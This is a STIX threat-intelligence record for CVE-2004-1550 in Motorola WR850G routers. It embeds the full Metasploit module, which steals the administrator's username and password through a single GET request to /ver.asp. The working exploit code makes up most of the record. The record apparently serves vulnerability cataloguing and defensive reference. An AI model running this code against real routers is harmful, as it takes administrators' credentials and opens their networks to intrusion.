{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--310eba0b-6a44-4e5a-961a-293262490e43",
    "created": "2024-08-14T16:22:40.487757Z",
    "modified": "2024-08-14T16:22:40.487761Z",
    "name": "Motorola WR850G v4.03 Credentials",
    "description": " Login credentials to the Motorola WR850G router with firmware v4.03 can be obtained via a simple GET request if issued while the administrator is logged in.  A lot more information is available through this request, but you can get it all and more after logging in. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/motorola/wr850g_cred.rb",
            "external_id": "wr850g_cred.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1550"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2004/Sep/0339.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Motorola WR850G v4.03 Credentials',\n      'Description'    => %q{\n          Login credentials to the Motorola WR850G router with\n        firmware v4.03 can be obtained via a simple GET request\n        if issued while the administrator is logged in.  A lot\n        more information is available through this request, but\n        you can get it all and more after logging in.\n      },\n      'Author'         => 'kris katterjohn',\n      'License'        => MSF_LICENSE,\n      'References'     => [\n          [ 'CVE', '2004-1550' ],\n          [ 'OSVDB', '10232' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2004/Sep/0339.html'],\n      ],\n      'DisclosureDate' => '2004-09-24'))\n\n    register_options([\n      Opt::RPORT(80)\n    ])\n  end\n\n  def run\n    connect\n\n    sock.put(\"GET /ver.asp HTTP/1.0\\r\\n\\r\\n\")\n    response = sock.get_once\n\n    disconnect\n\n    if response.nil? or response.empty?\n      print_status(\"No response from server\")\n      return\n    end\n\n    # 302 Redirect\n    if response.split(/\\r\\n/)[0] !~ /200 Ok/\n      print_status(\"Administrator not logged in\")\n      return\n    end\n\n    user = $1 if response.match(\"http_username=([^\\n]*)<br>\")\n    pass = $1 if response.match(\"http_passwd=([^\\n]*)<br>\")\n\n    print_status(\"Found username \\\"#{user}\\\" and password \\\"#{pass}\\\"\") if user and pass\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-09-24"
}